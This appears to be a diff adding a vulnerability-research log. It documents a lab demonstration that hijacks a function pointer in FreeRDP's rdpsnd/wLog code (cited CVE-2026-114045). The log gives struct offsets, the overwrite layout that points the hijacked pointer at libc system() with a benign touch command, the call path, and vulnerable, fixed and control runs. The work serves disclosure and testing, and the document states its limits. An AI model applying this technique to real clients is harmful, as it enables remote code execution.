@@ -1,0 +1,89 @@
+freerdp2shell wake 20 — chosen indirect call target through the live rdpsnd
+wLog object (CVE-2026-114045 / GHSA-3m9q-g533-rqjq)
+
+Question (operator DM #5451): can wake 13/18's controlled dereference reach a
+call target or a lab-chosen benign-command side effect on the pinned loopback
+build? Answer: YES in the scratch lab build — a chosen function pointer in the
+overwritten `s_wLog` is consumed as `log->custom(log->context)` by real FreeRDP
+WLog layout code and executes a benign command. This is a LAB-MECHANICS rung-4
+result, NOT rung 5: the written bytes come from the lab's server-side
+synthetic audio source (wake 17), not from the client wire, and the copy needs
+the lab's timing delay. Default posture here is post-auth (-auth, PR:L).
+
+Build and configuration
+-----------------------
+- Pinned FreeRDP 3.32.0 d27a4f7c1c63b62a5e60e5d939ad116cfb58ffc1 in
+  /tmp/fr-wake2/src3320; plain no-sanitizer shadow build
+  /tmp/fr-wake7-shadow-build; committed wake8 replay patches and their
+  digests untouched; all changes described here are scratch-only.
+- freerdp-shadow-cli on 127.0.0.1:23230-23255, -auth, /log-level:DEBUG;
+  Sample sfreerdp /sec:rdp /u:test /p:test /sound. No off-loopback probe.
+- Subsystem-supplied wrap-capable ADPCM format table (committed wake8 server
+  patch), two SNDC_FORMATS PDUs, scratch client Sleep(2500) after PDU 2 so the
+  natural quality-mode WLog_DBG lands after the copy (wake 14 timing).
+  No WLOG_FILTER is needed: the overwrite sets log->FilterLevel = 0.
+
+Struct geometry measured in this build
+--------------------------------------
+`offsetof` compiled against the pinned internal wlog.h
+(winpr/libwinpr/utils/wlog/wlog.h:61-81):
+  Names 24, Appender 40, Parent 48, lock 72 (48-byte CRITICAL_SECTION),
+  custom 112, context 120, independent 128, sizeof(s_wLog) 136.
+The live object is at out_buffer+8880 (wake 13), i.e. custom at +8992 and
+context at +9000; wake 18's format-count grooming shifts both by 32*N.
+A pre-copy dump of all 18 eight-byte words at the live object is in
+/tmp/fr-wake20-run6/server.log (WAKE20_FIELD lines).
+
+Chosen-byte construction (scratch code at the real CopyMemory site)
+------------------------------------------------------------------
+The lab synthetic playback buffer (16384 bytes, normally 0xDE) receives:
+  +off+0     Name     = pointer to the command string
+  +off+8     FilterLevel = 0 (TRACE) so no filter/Names dereference is needed
+  +off+40    Appender = original value (NULL; inherited from Parent)
+  +off+48    Parent   = original value (live root wLog)
+  +off+112   custom   = address of libc system()
+  +off+120   context  = pointer to the command string at out_buffer+12000
+  out_buffer+12000    "touch /tmp/frw20-rce-marker"
+The real CopyMemory then writes these bytes with a 16384-byte chosen span.
+No server-side log call was injected: the log is FreeRDP's own client
+quality-mode WLog_DBG on the clobbered rdpsnd TAG.
+
+Observed path
+-------------
+Debugger backtrace from a mis-offset intermediate run
+(/tmp/fr-wake20-gdb2/gdb.log) reaches the real layout path:
+  WLog_Print_dbg_tag -> WLog_PrintTextMessageInternal ->
+  WLog_ConsoleAppender_WriteMessage -> WLog_Layout_GetMessagePrefix ->
+  replace_format_string -> __snprintf_chk("%s", arg) -> strlen
+(`Layout.c:211-213` calls `opt->fkt(opt->arg.pv)` = `log->custom(log->context)`
+for the default layout's `%{[%ctx]%}` option, gated by `skip_if_null` on
+`log->context`). With the corrected offsets:
+
+  vulnerable: realloc failed!, WAKE9_COPY dst_off=0 cframesize=16384
+              b8820=de; /tmp/frw20-rce-marker CREATED (12:39:05.376Z, 12:45:35.836Z)
+  no-call:    same wrap and 16384-byte copy, custom zeroed by FR_NO_CALL=1,
+              NO marker (/tmp/fr-wake20-nocall)
+  fixed:      upstream-style `nBlockAlign / 7 < nChannels` guard in the
+              WAVE_FORMAT_ADPCM branch; no wrap (normal 8820+7564 copy),
+              NO marker (/tmp/fr-wake20-fixed2)
+  safe input: FR_BENIGN_ONLY=1 (PDU 1 only); no wrap (8820+7564 copy),
+              NO marker (/tmp/fr-wake20-benign2)
+
+Raw logs: /tmp/fr-wake20-{run7,positive-final,nocall,fixed2,benign2}/
+(gitignored /tmp). Digests and committed replay scripts unchanged.
+
+Honest boundary
+---------------
+- The CLIENT controls the malformed format (wrap) and, via format-record
+  count, the target offset (wake 18); it does NOT choose the bytes written.
+  The function pointer, argument and command string come from the lab's
+  server-side synthetic playback source. Wake 17 source-bounds the copied
+  bytes and stride to the server's platform audio capture in stock builds.
+- A lab timing delay is still required for a post-write log; a WLOG_FILTER is
+  not, because FilterLevel is overwritten. Two of the wLog fields (Appender,
+  Parent) are preserved via the playback source so the real appender chain can
+  be reached; without that preservation the log faults earlier. This is a
+  laboratory call-target demonstration, not a wire-only RCE and not witness
+  acceptance.
+- Scratch sources were restored after capture; committed wake8 patches,
+  their digests and verify_live.sh were not changed. No probe off loopback.
